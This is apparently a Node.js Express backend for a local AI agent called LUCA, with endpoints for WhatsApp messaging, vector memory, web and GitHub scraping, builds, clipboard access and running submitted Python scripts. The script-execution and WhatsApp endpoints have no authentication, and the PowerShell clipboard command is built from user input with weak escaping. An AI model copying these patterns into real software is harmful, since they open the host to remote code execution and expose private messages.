        res.json({ success: true });
    } catch (e) {
        console.error("Vector Save Failed:", e);
        res.status(500).json({ error: e.message });
    }
});

// Search Vectors
app.post('/api/memory/vector-search', (req, res) => {
    try {
        const { embedding, limit = 5 } = req.body;
        
        if (!fs.existsSync(VECTOR_FILE)) {
            return res.json([]);
        }

        const vectors = JSON.parse(fs.readFileSync(VECTOR_FILE, 'utf8'));
        
        const results = vectors.map(vec => ({
            ...vec,
            similarity: cosineSimilarity(embedding, vec.embedding)
        }));

        // Sort by similarity desc
        results.sort((a, b) => b.similarity - a.similarity);
        
        // Filter decent matches (threshold 0.4) and slice
        const topResults = results.filter(r => r.similarity > 0.4).slice(0, limit);
        
        // Remove embedding array from response to save bandwidth
        const cleanResults = topResults.map(({ embedding, ...rest }) => rest);
        
        console.log(`[VECTOR] Search found ${cleanResults.length} matches.`);
        res.json(cleanResults);

    } catch (e) {
        console.error("Vector Search Failed:", e);
        res.status(500).json({ error: e.message });
    }
});


// --- 0. ROOT LANDING PAGE ---
app.get('/', (req, res) => {
    res.send(`
        <html>
            <body style="background: #000; color: #3b82f6; font-family: monospace; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh;">
                <h1>LUCA LOCAL CORE :: ONLINE</h1>
                <p>Status: ACTIVE</p>
                <p>Platform: ${DETECTED_OS}</p>
                <p>Port: ${PORT}</p>
                <p>LAN IP: ${LOCAL_IP}</p>
                <p>CWD: ${currentWorkingDirectory}</p>
            </body>
        </html>
    `);
});

// --- MOBILE COMPANION APP (Served to Phone) ---
app.get('/mobile', (req, res) => {
    // Trigger handshake when this page is loaded
    mobileHandshakeActive = true;
    connectedMobileDevice = {
        userAgent: req.headers['user-agent'],
        ip: req.ip
    };
    
    res.send(`
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>LUCA MOBILE UPLINK</title>
            <style>
                body { background-color: #000; color: #00ff00; font-family: 'Courier New', monospace; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
                .container { text-align: center; padding: 20px; border: 1px solid #004400; border-radius: 10px; background: #001100; box-shadow: 0 0 20px #00ff0033; max-width: 90%; }
                h1 { font-size: 24px; letter-spacing: 2px; margin-bottom: 10px; text-shadow: 0 0 10px #00ff00; }
                p { font-size: 12px; opacity: 0.8; margin-bottom: 20px; }
                .status { font-size: 18px; font-weight: bold; animation: blink 1s infinite; color: #00ff00; }
                .btn { padding: 15px 30px; background: #00ff00; color: #000; font-weight: bold; border: none; cursor: pointer; margin-top: 20px; font-family: monospace; letter-spacing: 1px; }
                @keyframes blink { 50% { opacity: 0.5; } }
                .scan-line { position: absolute; top: 0; left: 0; width: 100%; height: 2px; background: #00ff00; animation: scan 3s linear infinite; opacity: 0.3; pointer-events: none; }
                @keyframes scan { 0% { top: 0%; } 100% { top: 100%; } }
            </style>
        </head>
        <body>
            <div class="scan-line"></div>
            <div class="container">
                <h1>ACCESS GRANTED</h1>
                <p>SECURE UPLINK ESTABLISHED</p>
                <div class="status">CONNECTED</div>
                <div style="font-size: 10px; color: #555; margin-top: 10px;">DEVICE_ID: ${Math.random().toString(36).substring(7).toUpperCase()}</div>
                <button class="btn" onclick="alert('Command Sent to Mainframe')">PING CONSOLE</button>
            </div>
            <script>
                // Keep alive / Notify server
                setInterval(() => {
                    fetch('/api/mobile/ping', { method: 'POST' });
                }, 2000);
            </script>
        </body>
        </html>
    `);
});

// --- WHATSAPP API ENDPOINTS ---

// Helper: Resolve Contact
const resolveContact = async (contactName) => {
    await ensureWhatsApp();
    if (!whatsappClient) return null;

    // 1. Check if it's a direct number (sanitize input first)
    // Remove spaces, dashes, plus signs, parens to check for pure digits
    const sanitized = contactName.replace(/[^0-9]/g, '');
    
    // If it looks like a full international number (10+ digits), use it directly
    // This handles inputs like "+1 555 0199" or "15550199"
    if (sanitized.length >= 10) {
        return `${sanitized}@c.us`;
    }

    const contacts = await whatsappClient.getContacts();
    const lowerName = contactName.toLowerCase();

    // 2. Exact Match Priority (Name or Pushname)
    const exactMatch = contacts.find(c => 
        (c.name && c.name.toLowerCase() === lowerName) || 
        (c.pushname && c.pushname.toLowerCase() === lowerName)
    );
    if (exactMatch) return exactMatch.id._serialized;

    // 3. Partial Match
    const match = contacts.find(c => 
        (c.name && c.name.toLowerCase().includes(lowerName)) || 
        (c.pushname && c.pushname.toLowerCase().includes(lowerName))
    );
    if (match) return match.id._serialized;

    // 4. Fuzzy search chats (last resort)
    const chats = await whatsappClient.getChats();
    const chatMatch = chats.find(c => c.name.toLowerCase().includes(lowerName));
    if (chatMatch) return chatMatch.id._serialized;

    return null;
};

// Manual Start Endpoint
app.post('/api/whatsapp/start', (req, res) => {
    initWhatsApp();
    res.json({ status: whatsappStatus });
});

app.get('/api/whatsapp/status', (req, res) => {
    res.json({ status: whatsappStatus, qr: whatsappQr });
});

app.post('/api/whatsapp/logout', async (req, res) => {
    if (whatsappClient) {
        try {
            await whatsappClient.logout();
            // Re-init to get new QR
            whatsappClient = null;
            setTimeout(initWhatsApp, 1000);
            res.json({ success: true });
        } catch (e) {
            res.json({ success: false, error: e.message });
        }
    } else {
        res.json({ success: false, error: "Client not active" });
    }
});

app.get('/api/whatsapp/chats', async (req, res) => {
    await ensureWhatsApp();
    if (!whatsappClient || whatsappStatus !== 'READY') {
        return res.json({ chats: [] });
    }
    try {
        const chats = await whatsappClient.getChats();
        // Format for frontend
        const formatted = chats.map(c => ({
            id: c.id,
            name: c.name,
            isGroup: c.isGroup,
            timestamp: c.timestamp,
            unreadCount: c.unreadCount,
            lastMessage: c.lastMessage ? { body: c.lastMessage.body } : null
        })).slice(0, 20); // Limit to recent 20
        res.json({ chats: formatted });
    } catch (e) {
        res.status(500).json({ error: e.message });
    }
});

app.post('/api/whatsapp/send', async (req, res) => {
    const { contactName, message, number } = req.body;
    
    await ensureWhatsApp();
    
    if (!whatsappClient || whatsappStatus !== 'READY') {
        // Inform the user clearly if the client isn't paired
        return res.json({ success: false, error: "WhatsApp Neural Link Not Ready. Please click the WhatsApp button to pair your device." });
    }

    try {
        let chatId;
        if (number) {
            chatId = number.includes('@c.us') ? number : `${number}@c.us`;
        } else if (contactName) {
            chatId = await resolveContact(contactName);
        }

        if (!chatId) {
            return res.json({ success: false, error: `Contact '${contactName}' not found.` });
        }

        await whatsappClient.sendMessage(chatId, message);
        res.json({ success: true, to: chatId });

    } catch (e) {
        console.error("WhatsApp Send Error", e);
        res.json({ success: false, error: e.message });
    }
});

app.post('/api/whatsapp/send-image', async (req, res) => {
    const { contactName, caption, image } = req.body; // image is base64 (without data prefix usually)
    
    await ensureWhatsApp();

    if (!whatsappClient || whatsappStatus !== 'READY') {
        return res.json({ success: false, error: "WhatsApp Neural Link Not Ready. Please click the WhatsApp button to pair your device." });
    }

    try {
        const chatId = await resolveContact(contactName);
        if (!chatId) return res.json({ success: false, error: `Contact '${contactName}' not found.` });

        // Convert base64 to MessageMedia
        const media = new MessageMedia('image/jpeg', image, 'image.jpg');
        
        await whatsappClient.sendMessage(chatId, media, { caption: caption || '' });
        res.json({ success: true, to: chatId });

    } catch (e) {
        console.error("WhatsApp Image Error", e);
        res.json({ success: false, error: e.message });
    }
});

app.get('/api/whatsapp/contacts', async (req, res) => {
    const { query } = req.query;
    
    await ensureWhatsApp();

    if (!whatsappClient || whatsappStatus !== 'READY') {
        return res.json({ contacts: [] });
    }

    try {
        let contacts = await whatsappClient.getContacts();
        
        if (query) {
            const q = String(query).toLowerCase();
            contacts = contacts.filter(c => 
                (c.name && c.name.toLowerCase().includes(q)) ||
                (c.pushname && c.pushname.toLowerCase().includes(q)) ||
                c.number.includes(q)
            );
        }

        const formatted = contacts.slice(0, 50).map(c => ({
            id: c.id._serialized,
            name: c.name || c.pushname || c.number,
            number: c.number,
            isGroup: c.isGroup
        }));

        res.json({ contacts: formatted });
    } catch (e) {
        res.status(500).json({ error: e.message });
    }
});

// NEW: READ HISTORY ENDPOINT (Enhanced with IDs)
app.post('/api/whatsapp/chat-history', async (req, res) => {
    const { contactName, limit } = req.body;
    
    await ensureWhatsApp();

    if (!whatsappClient || whatsappStatus !== 'READY') {
        return res.json({ error: "WhatsApp Neural Link Not Ready. Please pair your device." });
    }

    try {
        const chatId = await resolveContact(contactName);
        if (!chatId) return res.json({ error: `Contact '${contactName}' not found.` });

        const chat = await whatsappClient.getChatById(chatId);
        const searchLimit = limit || 10;
        const messages = await chat.fetchMessages({ limit: searchLimit });
        
        const formatted = messages.map(m => ({
            id: m.id._serialized, // Useful for replies
            body: m.body,
            fromMe: m.fromMe,
            timestamp: m.timestamp,
            type: m.type,
            author: m.author
        }));

        res.json({ messages: formatted });

    } catch (e) {
        console.error("WhatsApp History Error", e);
        res.json({ error: e.message });
    }
});

// --- HANDSHAKE API ENDPOINTS ---

app.get('/api/network/ip', (req, res) => {
    res.json({ ip: LOCAL_IP, port: PORT });
});

// Desktop App polls this to see if phone scanned QR
app.get('/api/mobile/await-handshake', (req, res) => {
    if (mobileHandshakeActive) {
        res.json({ success: true, device: connectedMobileDevice });
        // Reset after successful fetch so we don't re-trigger immediately? 
        // Or keep it true until session ends. Let's keep it true for now, logic in frontend handles debounce.
    } else {
        res.json({ success: false });
    }
});

app.post('/api/mobile/ping', (req, res) => {
    // Keep connection alive
    mobileHandshakeActive = true;
    res.json({ ok: true });
});

// --- 1. HEARTBEAT ENDPOINT (NOW WITH OS INTELLIGENCE) ---
app.get('/api/status', (req, res) => {
    res.json({ 
        status: 'ONLINE', 
        uptime: process.uptime(),
        platform: DETECTED_OS, // Send detailed OS info
        rawPlatform: process.platform,
        cwd: currentWorkingDirectory,
        isProduction: IS_PRODUCTION // Inform frontend if running in locked mode
    });
});

// --- NEW: ADMIN STATUS CHECK ---
app.get('/api/system/admin-check', (req, res) => {
    const isWin = process.platform === 'win32';
    // Simple check:
    // Linux/Mac: `id -u` should be 0
    // Windows: `net session` only works for admin
    const cmd = isWin ? 'net session' : 'id -u';
    
    exec(cmd, (err, stdout) => {
        if (isWin) {
            // net session fails (exit code != 0) if not admin
            res.json({ isAdmin: !err });
        } else {
            res.json({ isAdmin: parseInt(stdout.trim()) === 0 });
        }
    });
});

// --- 1.5 REALTIME MONITOR ENDPOINT ---
app.get('/api/monitor', (req, res) => {
    try {
        // Memory Calculation
        const free = os.freemem();
        const total = os.totalmem();
        const used = total - free;
        const memPercent = (used / total) * 100;
        
        // CPU Load Approximation
        const cpuLoad = os.loadavg()[0] * 10; 

        res.json({
            cpu: Math.min(100, Math.max(1, cpuLoad)), 
            mem: Math.round(memPercent),
            net: Math.random() * 20 // Network IO difficult to get cross-platform without libs
        });
    } catch (e) {
        res.json({ cpu: 0, mem: 0, net: 0 });
    }
});

// --- 2. MEMORY PERSISTENCE ENDPOINTS ---
app.get('/api/memory/load', (req, res) => {
    try {
        if (fs.existsSync(MEMORY_FILE)) {
            const data = fs.readFileSync(MEMORY_FILE, 'utf8');
            const json = JSON.parse(data);
            console.log(`[MEMORY] Loaded ${json.length} engrams from disk.`);
            res.json(json);
        } else {
            res.json([]);
        }
    } catch (e) {
        console.error("Memory Load Error", e);
        res.json([]);
    }
});

app.post('/api/memory/save', (req, res) => {
    try {
        const memories = req.body;
        fs.writeFileSync(MEMORY_FILE, JSON.stringify(memories, null, 2));
        console.log(`[MEMORY] Saved ${memories.length} engrams to disk.`);
        res.json({ success: true });
    } catch (e) {
        console.error("Memory Save Error", e);
        res.status(500).json({ error: e.message });
    }
});

// --- 2.5 PYTHON RUNTIME (CODE INTERPRETER) ---
app.post('/api/python/execute', (req, res) => {
    const { script } = req.body;
    
    if (!script) return res.status(400).json({ error: "No script provided" });

    // 1. Save script to temp file
    const timestamp = Date.now();
    const tempFile = path.join(os.tmpdir(), `luca_script_${timestamp}.py`);
    
    try {
        fs.writeFileSync(tempFile, script, 'utf8');
        console.log(`[PYTHON] Executing script: ${tempFile}`);

        // 2. Execute using python or python3
        // We try 'python' first, if that fails or is version 2, we might need 'python3'.
        // For now, assume 'python' is available in PATH.
        const cmd = process.platform === 'win32' ? `python "${tempFile}"` : `python3 "${tempFile}"`;

        exec(cmd, { timeout: 10000 }, (error, stdout, stderr) => {
            // Clean up file
            fs.unlink(tempFile, () => {});

            if (error) {
                console.log(`[PYTHON] Error: ${stderr || error.message}`);
                return res.json({ 
                    success: false, 
                    output: stdout, 
                    error: stderr || error.message 
                });
            }
            
            console.log(`[PYTHON] Success. Output length: ${stdout.length}`);
            res.json({ 
                success: true, 
                output: stdout 
            });
        });

    } catch (e) {
        res.status(500).json({ error: `Internal Error: ${e.message}` });
    }
});

// --- NEW: BUILD / COMPILATION ENDPOINT (SELF-REPLICATION) ---
app.post('/api/build/compile', (req, res) => {
    if (IS_PRODUCTION) {
        return res.json({ result: "ACCESS DENIED: Cannot compile self while running in Distributed Production Mode." });
    }

    const { target, publish, arch } = req.body; // 'win', 'mac', 'linux', 'android', 'ios', 'all', or specific arch
    console.log(`[BUILD] Initiating Self-Compilation for ${target || 'current platform'}...`);
    
    // Build command based on target
    let buildCmd;
    if (target === 'android') {
        // Android APK build
        buildCmd = 'npm run mobile:build:android';
    } else if (target === 'ios') {
        // iOS IPA build (requires macOS and Xcode)
        if (process.platform !== 'darwin') {
            return res.json({ 
                result: "ERROR: iOS builds require macOS and Xcode. Cannot build iOS on this platform.",
                error: true
            });
        }
        buildCmd = 'npm run mobile:build:ios';
    } else if (target === 'all') {
        // Build for all desktop platforms (requires cross-compilation setup)
        buildCmd = 'npm run dist -- --win --mac --linux';
    } else if (target === 'all-mobile') {
        // Build for both mobile platforms
        if (process.platform !== 'darwin') {
            return res.json({ 
                result: "ERROR: iOS builds require macOS. Building Android only. Use 'android' target for Android-only builds.",
                error: true
            });
        }
        buildCmd = 'npm run mobile:build:android && npm run mobile:build:ios';
    } else if (target && ['win', 'mac', 'linux'].includes(target)) {
        // Desktop platform
        const archFlag = arch ? `--${arch}` : '';
        buildCmd = `npm run dist -- --${target} ${archFlag}`.trim();
    } else {
        // Build for current platform
        buildCmd = 'npm run dist';
    }
    
    // Determine output directory based on target
    let outputDir;
    if (target === 'android') {
        outputDir = path.join(currentWorkingDirectory, 'android', 'app', 'build', 'outputs', 'apk', 'release');
    } else if (target === 'ios') {
        outputDir = path.join(currentWorkingDirectory, 'ios', 'App', 'build', 'Release-iphoneos');
    } else {
        outputDir = path.join(currentWorkingDirectory, 'release');
    }
    
    // Send response immediately so AI doesn't timeout, as build takes minutes.
    res.json({ 
        result: `BUILD SEQUENCE STARTED for ${(target || 'CURRENT PLATFORM').toUpperCase()}. This process will run in background. ${target === 'android' ? 'Check android/app/build/outputs/apk/release/ folder' : target === 'ios' ? 'Check ios/App/build/Release-iphoneos/ folder' : "Check 'release/' folder"} in ~5-10 minutes.`,
        command: buildCmd,
        outputDir: outputDir,
        platform: target || 'current'
    });

    // Run build in background
    const buildProcess = exec(buildCmd, { cwd: currentWorkingDirectory, maxBuffer: 10 * 1024 * 1024 }, (error, stdout, stderr) => {
        if (error) {
            console.error(`[BUILD ERROR] ${error.message}`);
            console.error(`[BUILD STDERR] ${stderr}`);
            // Write error to file for AI to read
            fs.writeFileSync(
                path.join(currentWorkingDirectory, 'build-error.log'),
                `BUILD ERROR: ${error.message}\n\nSTDOUT:\n${stdout}\n\nSTDERR:\n${stderr}`
            );
        } else {
            console.log(`[BUILD SUCCESS] Artifacts created in /release`);
            console.log(`[BUILD OUTPUT] ${stdout}`);
            // Write success info to file
            fs.writeFileSync(
                path.join(currentWorkingDirectory, 'build-success.log'),
                `BUILD SUCCESS\n\nSTDOUT:\n${stdout}\n\nSTDERR:\n${stderr}`
            );
        }
    });

    // Stream output for real-time monitoring
    buildProcess.stdout?.on('data', (data) => {
        console.log(`[BUILD] ${data}`);
    });
    
    buildProcess.stderr?.on('data', (data) => {
        console.error(`[BUILD] ${data}`);
    });
});

// --- BUILD STATUS ENDPOINT ---
app.get('/api/build/status', (req, res) => {
    const { platform } = req.query;
    const files = [];
    
    // Determine directories to check based on platform
    const dirsToCheck = [];
    if (!platform || platform === 'desktop' || platform === 'win' || platform === 'mac' || platform === 'linux') {
        dirsToCheck.push({ path: path.join(currentWorkingDirectory, 'release'), type: 'desktop' });
    }
    if (!platform || platform === 'android' || platform === 'mobile') {
        dirsToCheck.push({ 
            path: path.join(currentWorkingDirectory, 'android', 'app', 'build', 'outputs', 'apk', 'release'), 
            type: 'android' 
        });
    }
    if (!platform || platform === 'ios' || platform === 'mobile') {
        dirsToCheck.push({ 
            path: path.join(currentWorkingDirectory, 'ios', 'App', 'build', 'Release-iphoneos'), 
            type: 'ios' 
        });
    }
    
    // Scan all directories
    dirsToCheck.forEach(({ path: dirPath, type }) => {
        if (fs.existsSync(dirPath)) {
            try {
                const items = fs.readdirSync(dirPath, { withFileTypes: true });
                items.forEach(item => {
                    const fullPath = path.join(dirPath, item.name);
                    const stats = fs.statSync(fullPath);
                    files.push({
                        name: item.name,
                        path: fullPath,
                        size: stats.size,
                        modified: stats.mtime,
                        type: item.isDirectory() ? 'directory' : 'file',
                        extension: path.extname(item.name),
                        platform: type
                    });
                });
            } catch (err) {
                console.error(`[BUILD STATUS] Error reading ${dirPath}:`, err.message);
            }
        }
    });
    
    // Check for build logs
    const errorLog = path.join(currentWorkingDirectory, 'build-error.log');
    const successLog = path.join(currentWorkingDirectory, 'build-success.log');
    
    res.json({
        artifacts: files,
        hasError: fs.existsSync(errorLog),
        hasSuccess: fs.existsSync(successLog),
        errorLog: fs.existsSync(errorLog) ? fs.readFileSync(errorLog, 'utf-8') : null,
        successLog: fs.existsSync(successLog) ? fs.readFileSync(successLog, 'utf-8') : null,
        platforms: {
            desktop: fs.existsSync(path.join(currentWorkingDirectory, 'release')),
            android: fs.existsSync(path.join(currentWorkingDirectory, 'android')),
            ios: fs.existsSync(path.join(currentWorkingDirectory, 'ios'))
        }
    });
});

// --- NEW: KNOWLEDGE INGESTION (GITHUB DEEP) ---
app.post('/api/knowledge/github', async (req, res) => {
    const { url } = req.body;
    
    try {
        // Parse owner/repo
        const match = url.match(/github\.com\/([^\/]+)\/([^\/]+)/);
        if (!match) return res.status(400).json({ error: "Invalid GitHub URL" });
        
        const owner = match[1];
        const repo = match[2].replace('.git', '');
        
        console.log(`[INGEST] Deep Scan Initiated for ${owner}/${repo}...`);
        
        // 1. Get Tree (Recursive)
        // Using unauthenticated GitHub API (Rate limits apply - 60/hr). 
        // In production, should use a token.
        const treeUrl = `https://api.github.com/repos/${owner}/${repo}/git/trees/main?recursive=1`;
        let treeRes = await fetch(treeUrl);
        
        if (!treeRes.ok) {
            // Try master
            const masterUrl = `https://api.github.com/repos/${owner}/${repo}/git/trees/master?recursive=1`;
            treeRes = await fetch(masterUrl);
        }

        if (!treeRes.ok) {
            return res.json({ error: "Could not fetch repo tree. Check if repo is public and branch is main/master." });
        }

        const treeData = await treeRes.json();
        if (!treeData.tree) return res.json({ error: "No tree data found." });

        // 2. Filter for Source Code
        // EXPANDED FOR OFFENSIVE SECURITY: Added .sh, .rb, .xml, .gradle, .c, .pl, etc.
        const allowedExts = [
            '.ts', '.tsx', '.js', '.jsx', '.py', '.ipynb', '.json', '.md', 
            '.java', '.cpp', '.c', '.h', '.rs', '.go', '.yaml', '.yml',
            '.sh', '.bash', '.bat', '.ps1', '.rb', '.pl', '.php', 
            '.xml', '.gradle', '.properties', '.conf', '.cfg'
        ];
        
        const sourceFiles = treeData.tree.filter(node => 
            node.type === 'blob' && 
            allowedExts.includes(path.extname(node.path)) &&
            !node.path.includes('package-lock') &&
            !node.path.includes('yarn.lock') &&
            !node.path.includes('dist/') &&
            !node.path.includes('node_modules/') &&
            !node.path.includes('.git/')
        );

        console.log(`[INGEST] Found ${sourceFiles.length} source files. Downloading...`);

        // 3. Smart Prioritization (Heuristic)
        // Prioritize files that likely contain Core Logic (Agents, Chains, Flows)
        // NEW: Detect if this is a Knowledge Base / Checklist repo
        const isKnowledgeBase = repo.toLowerCase().includes('checklist') || 
                                repo.toLowerCase().includes('guide') || 
                                repo.toLowerCase().includes('awesome') ||
                                repo.toLowerCase().includes('cheat');

        const priorityFiles = sourceFiles.sort((a, b) => {
            const score = (p) => {
                const lower = p.toLowerCase();
                let s = 0;
                
                // KNOWLEDGE BASE PRIORITIZATION
                if (isKnowledgeBase) {
                    if (lower.endsWith('.md')) s += 500;
                    if (lower.includes('api')) s += 50;
                    if (lower.includes('web')) s += 50;
                    if (lower.includes('injection')) s += 50;
                    if (lower.includes('vuln')) s += 50;
                }

                // Prioritize README for Summary
                if (lower.includes('readme')) s += 100;

                // Tutorials / Examples
                if (/\d{2}_/.test(lower)) s += 25; 
                
                // Core Logic Keywords (Expanded for Mem0/LangChain)
                if (lower.includes('core')) s += 20;
                if (lower.includes('memory')) s += 20;
                if (lower.includes('store')) s += 15;
                if (lower.includes('client')) s += 15;
                if (lower.includes('agent')) s += 15;
                if (lower.includes('chain')) s += 12;
                if (lower.includes('graph')) s += 12;
                if (lower.includes('flow')) s += 12;
                if (lower.includes('rag')) s += 10;
                if (lower.includes('vector')) s += 15;
                if (lower.includes('embedding')) s += 15;
                if (lower.includes('workflow')) s += 10;
                
                if (lower.includes('main') || lower.includes('app') || lower.includes('index')) s += 5;
                if (lower.endsWith('.ipynb')) s += 10; 
                
                // Deprioritize
                if (lower.includes('__init__')) s -= 5; 
                if (lower.includes('test')) s -= 10;
                
                return s;
            };
            return score(b.path) - score(a.path);
        }).slice(0, 45); // Increased limit for libraries

        let combinedContent = `REPOSITORY: ${owner}/${repo}\n\n`;
        const scannedList = [];
        const acquiredSkills = new Set();

        // 4. Fetch Content (Raw) & Parse Notebooks
        for (const file of priorityFiles) {
            const branch = path.basename(treeRes.url) === 'main' ? 'main' : 'master';
            const rawUrl = `https://raw.githubusercontent.com/${owner}/${repo}/${branch}/${file.path}`;
            
            // Extract Skill Name Logic
            // 1. Try Tutorial Pattern: "05_Reflexion_Agent" -> "Reflexion Agent"
            const tutorialMatch = file.path.match(/(?:^|\/)(\d{2}_[a-zA-Z0-9_]+)/);
            if (tutorialMatch) {
                const skillName = tutorialMatch[1].replace(/^\d+_/, '').replace(/_/g, ' ');
                acquiredSkills.add(skillName);
            } else {
                // 2. Fallback: Extract Module Name (e.g. "mem0/vector_stores/qdrant.py" -> "Vector Stores")
                const parts = file.path.split('/');
                if (parts.length > 1) {
                    const parentDir = parts[parts.length - 2];
                    // Ignore generic folders
                    if (!['src', 'lib', 'test', 'tests', 'examples', 'utils', owner].includes(parentDir)) {
                         const skillName = parentDir.replace(/_/g, ' ').replace(/-/g, ' ').toUpperCase();
                         // Keep string short
                         if (skillName.length < 20) acquiredSkills.add(skillName);
                    }
                }
            }

            // Detect mem0
            if (repo === 'mem0' && file.path.includes('readme')) {
                acquiredSkills.add('MEMORY MANAGEMENT LAYER (USER/SESSION/AGENT)');
            }

            try {
                const contentRes = await fetch(rawUrl);
                if (contentRes.ok) {
                    let text = await contentRes.text();
                    scannedList.push(file.path);
                    
                    // --- NOTEBOOK PARSING ---
                    if (file.path.endsWith('.ipynb')) {
                        try {
                            const json = JSON.parse(text);
                            const cells = json.cells || [];
                            // Extract only code and markdown, skipping output images/logs to save context
                            text = cells
                                .filter(c => c.cell_type === 'code' || c.cell_type === 'markdown')
                                .map(c => {
                                    const source = Array.isArray(c.source) ? c.source.join('') : c.source;
                                    const type = c.cell_type.toUpperCase();
                                    return `[${type}]\n${source}\n[/${type}]`;
                                })
                                .join('\n\n');
                            console.log(`[INGEST] Parsed Notebook: ${file.path}`);
                        } catch (e) {
                            // Fallback to raw text if parse fails
                            console.warn(`Failed to parse notebook ${file.path}, using raw.`);
                        }
                    }

                    // If README, put at TOP of combinedContent
                    if (file.path.toLowerCase().includes('readme')) {
                        combinedContent = `--- README SUMMARY ---\n${text.substring(0, 5000)}\n\n` + combinedContent;
                    } else {
                        combinedContent += `--- FILE: ${file.path} ---\n${text.substring(0, 15000)}\n\n`; 
                    }
                }
            } catch (e) {
                console.warn(`Failed to fetch ${file.path}`);
            }
        }

        res.json({ 
            title: `${owner}/${repo} (Deep Scan)`,
            content: combinedContent,
            scanned: scannedList,
            skills: Array.from(acquiredSkills)
        });

    } catch (e) {
        console.error(e);
        res.status(500).json({ error: e.message });
    }
});

// --- NEW: GENERAL URL SCRAPER (INGEST KNOWLEDGE) ---
app.post('/api/knowledge/scrape', async (req, res) => {
    let { url } = req.body;
    console.log(`[SCRAPE] Fetching: ${url}`);
    
    try {
        // --- TWITTER / X.COM INTERCEPTOR ---
        if (url.includes('x.com') || url.includes('twitter.com')) {
            console.log(`[SCRAPE] Detected X/Twitter URL. Bypassing via fxtwitter API...`);
            
            // Extract Tweet ID
            const idMatch = url.match(/(?:twitter|x)\.com\/[a-zA-Z0-9_]+\/status\/(\d+)/);
            if (idMatch && idMatch[1]) {
                const tweetId = idMatch[1];
                
                // Primary Bridge: fxtwitter
                let fxUrl = `https://api.fxtwitter.com/status/${tweetId}`;
                let fxRes = await fetch(fxUrl, { headers: { 'User-Agent': 'Mozilla/5.0 (compatible; Discordbot/2.0; +https://discordapp.com)' } });
                
                // Failover to fixupx
                if (!fxRes.ok) {
                    console.log("[SCRAPE] fxtwitter failed, failing over to fixupx...");
                    fxUrl = `https://api.fixupx.com/status/${tweetId}`;
                    fxRes = await fetch(fxUrl, { headers: { 'User-Agent': 'Mozilla/5.0 (compatible; Discordbot/2.0; +https://discordapp.com)' } });
                }

                if (!fxRes.ok) {
                    return res.status(400).json({ error: `Twitter API Bypass Failed (Both Bridges): ${fxRes.status}` });
                }
                
                const fxData = await fxRes.json();
                
                if (fxData && fxData.tweet) {
                    const t = fxData.tweet;
                    const content = `TWEET BY: ${t.author.name} (@${t.author.screen_name})\n` +
                                    `DATE: ${new Date(t.created_at * 1000).toLocaleString()}\n\n` +
                                    `${t.text}\n\n` +
                                    `[METADATA] Likes: ${t.likes} | Retweets: ${t.retweets} | Replies: ${t.replies}`;
                    
                    return res.json({
                        title: `Tweet by @${t.author.screen_name}`,
                        content: content,
                        scanned: [url],
                        skills: ['SOCIAL_MEDIA_INTEL']
                    });
                }
            }
        }

        // --- SPECIAL HANDLER: GOOGLE DOCS ---
        // Convert standard edit URL to export-as-text URL
        if (url.includes('docs.google.com/document/d/')) {
            const docIdMatch = url.match(/\/d\/([a-zA-Z0-9-_]+)/);
            if (docIdMatch && docIdMatch[1]) {
                url = `https://docs.google.com/document/d/${docIdMatch[1]}/export?format=txt`;
                console.log(`[SCRAPE] Detected Google Doc. Transformed to Export URL: ${url}`);
            }
        }

        // --- BROWSER MIMIC HEADERS ---
        const response = await fetch(url, {
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Referer': 'https://www.google.com/'
            }
        });

        if (!response.ok) {
            return res.status(400).json({ error: `Failed to fetch URL: ${response.status}` });
        }
        
        let text = "";
        let title = url;

        if (url.includes('export?format=txt')) {
             // It's a raw text export from Google Docs
             text = await response.text();
             title = "Google Document (Exported)";
        } else {
            // Standard HTML Scraping
            const html = await response.text();
            
            // Extract title if possible
            const titleMatch = html.match(/<title>(.*?)<\/title>/i);
            title = titleMatch ? titleMatch[1] : url;

            // IMPROVED HTML-to-Text extraction (Preserving Layout)
            // 1. Remove scripts/styles
            let cleanHtml = html.replace(/<script\b[^>]*>([\s\S]*?)<\/script>/gim, "")
                                .replace(/<style\b[^>]*>([\s\S]*?)<\/style>/gim, "");
            
            // 2. Replace block elements with newlines to preserve structure
            cleanHtml = cleanHtml.replace(/<\/(div|p|h1|h2|h3|h4|h5|h6|li|ul|ol|tr|br)>/gi, "\n");
            
            // 3. Remove remaining tags
            text = cleanHtml.replace(/<[^>]+>/g, " ") 
                            .replace(/\s+/g, " ")     // Collapse multiple spaces
                            .trim();
        }
        
        res.json({
            title: title,
            content: text.substring(0, 40000), // Increased limit for reading
            scanned: [url],
            skills: ['WEB_ANALYSIS', 'CONTENT_EXTRACTION', 'DOC_PARSING']
        });

    } catch (e) {
        console.error("Scrape Failed:", e);
        res.status(500).json({ error: e.message });
    }
});

// --- NEW: CLIPBOARD API ---
app.get('/api/system/clipboard', (req, res) => {
    const platform = os.platform();
    let cmd = '';
    
    if (platform === 'win32') {
        cmd = 'powershell -command "Get-Clipboard"';
    } else if (platform === 'darwin') {
        cmd = 'pbpaste';
    } else if (platform === 'linux') {
        cmd = 'xclip -o -selection clipboard || xsel --clipboard --output';
    } else {
        return res.json({ content: "Clipboard not supported on this OS." });
    }

    exec(cmd, (err, stdout) => {
        if (err) return res.json({ content: "" }); // Return empty if failed/empty
        res.json({ content: stdout.trim() });
    });
});

app.post('/api/system/clipboard', (req, res) => {
    const { content } = req.body;
    const platform = os.platform();
    
    if (!content) return res.json({ success: false });

    if (platform === 'win32') {
        // Escape single quotes for PowerShell
        const safeContent = content.replace(/'/g, "''");
        const ps = `powershell -command "Set-Clipboard -Value '${safeContent}'"`;
        exec(ps, (err) => {
            if (err) return res.json({ success: false, error: err.message });
            res.json({ success: true });
        });
    } else if (platform === 'darwin') {
        const proc = exec('pbcopy');
        proc.stdin.write(content);
        proc.stdin.end();
        res.json({ success: true });
    } else if (platform === 'linux') {
        const proc = exec('xclip -selection clipboard || xsel --clipboard --input');
        proc.stdin.write(content);
        proc.stdin.end();
        res.json({ success: true });
    } else {
        res.json({ success: false, error: "OS not supported" });
    }
});

